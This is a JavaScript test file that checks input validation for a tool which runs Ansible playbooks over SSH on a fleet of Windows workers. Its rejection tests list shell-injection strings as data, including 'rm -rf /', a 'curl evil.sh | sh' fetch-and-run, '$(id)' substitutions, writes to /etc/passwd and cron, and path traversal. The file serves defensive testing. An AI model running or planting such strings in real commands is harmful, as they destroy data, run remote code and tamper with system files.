/**
 * The ref reaches a remote shell, so its SHAPE is the containment.
 *
 * `ssh` joins its arguments into a single string the remote shell interprets, whatever the local caller
 * passes — so unlike `command: argv:` in Ansible, there is no structural escape here and the value has to
 * be constrained instead. Same rule as `isValidCaptureId`: make the dangerous thing inexpressible rather
 * than trying to reject it, on the machine that holds the fleet SSH key of all places.
 */
import { test } from "node:test";
import assert from "node:assert/strict";

import { validRef, PLAYBOOKS, LIMIT_PATTERN, PLAYBOOK_TIMEOUT_MS, DEFAULT_PLAYBOOK_TIMEOUT_MS }
  from "./fleet-playbook.mjs";

test("commits and ordinary branch names are accepted", () => {
  for (const ref of ["afec73d", "65ead9b1c2d3e4f5", "main", "v8-feature-schema", "origin/main", "v1.2.3"]) {
    assert.equal(validRef(ref), true, ref);
  }
});

test("anything that could reach a shell is refused", () => {
  for (const ref of [
    "main; rm -rf /", "main && curl evil.sh | sh", "$(id)", "`id`", "main | tee /etc/passwd",
    "main\nrm -rf /", "main > /etc/cron.d/x", "a'b", 'a"b', "main&", "",
  ]) {
    assert.equal(validRef(ref), false, JSON.stringify(ref));
  }
});

test("path traversal is refused even though slashes are legal in a ref", () => {
  // `origin/main` must work, so slashes cannot simply be banned — which is exactly what makes `..` its
  // own check rather than something the character class already covers.
  assert.equal(validRef("origin/main"), true);
  assert.equal(validRef("../../etc/passwd"), false);
  assert.equal(validRef("main/../../../root"), false);
});

test("an over-long ref is refused, so the bound is real rather than assumed", () => {
  assert.equal(validRef("a".repeat(64)), true);
  assert.equal(validRef("a".repeat(65)), false);
});

test("only the named playbooks are runnable, and they are names rather than paths", () => {
  // The same containment as `-e out=<name>` in lab-job.yml. This value reaches a shell on the box that
  // holds the fleet SSH key, so an arbitrary path here is an arbitrary playbook run against twelve
  // Windows machines.
  assert.deepEqual(PLAYBOOKS, ["deploy.yml", "sleep.yml", "provision-role.yml"]);
  // `provision.yml` stays REFUSED and that is not an oversight: it is the UTM/PowerShell provisioning
  // playbook, a different file from `provision-role.yml`, and only the role one should be reachable from
  // a laptop. Two files one character apart, one allowed and one not, is exactly what an allowlist is for.
  for (const bad of ["../../../etc/evil.yml", "provision.yml", "/tmp/x.yml", "deploy.yml; id"]) {
    assert.equal(PLAYBOOKS.includes(bad), false, bad);
  }
});

test("fleet:wake is deliberately NOT one of these", () => {
  // Wake sends Wake-on-LAN magic packets — UDP broadcasts on the LAN, no SSH — so it runs fine from a
  // laptop and routing it through the control plane would add a hop for nothing. Everything that has to
  // talk TO a worker needs the key, and that is the line this list draws.
  assert.equal(PLAYBOOKS.includes("wake.yml"), false);
});

test("--limit takes worker names, and nothing that could reach a shell", () => {
  for (const ok of ["a11y-worker-3", "a11y-worker-3,a11y-worker-4,a11y-worker-5", "a11y_workers"]) {
    assert.equal(LIMIT_PATTERN.test(ok), true, ok);
  }
  for (const bad of [
    "a11y-worker-3; id", "*", "!a11y-worker-2", "a11y-worker-3 a11y-worker-4", "$(id)",
    "../etc", "a11y-worker-3,", "", "all",
  ]) {
    assert.equal(LIMIT_PATTERN.test(bad), false, JSON.stringify(bad));
  }
});

test("a playbook that installs software gets a budget bigger than the default", () => {
  // `provision-role.yml` installs NVDA and an Edge MSI with `serial: 1`, so six boxes is six sequential
  // installs. At the 30-minute default the SSH is killed mid-provision, which leaves a box half
  // configured and a stamp that may or may not have been written — and `fleet:status` then reports
  // INCONSISTENT, which reads like a provisioning bug rather than a timeout.
  assert.ok(PLAYBOOK_TIMEOUT_MS["provision-role.yml"] > DEFAULT_PLAYBOOK_TIMEOUT_MS,
    "provisioning needs longer than a deploy; a ceiling that expires early turns still-working into failed");
  for (const name of Object.keys(PLAYBOOK_TIMEOUT_MS)) {
    assert.ok(PLAYBOOKS.includes(name), `${name} has a timeout but is not a runnable playbook`);
  }
});
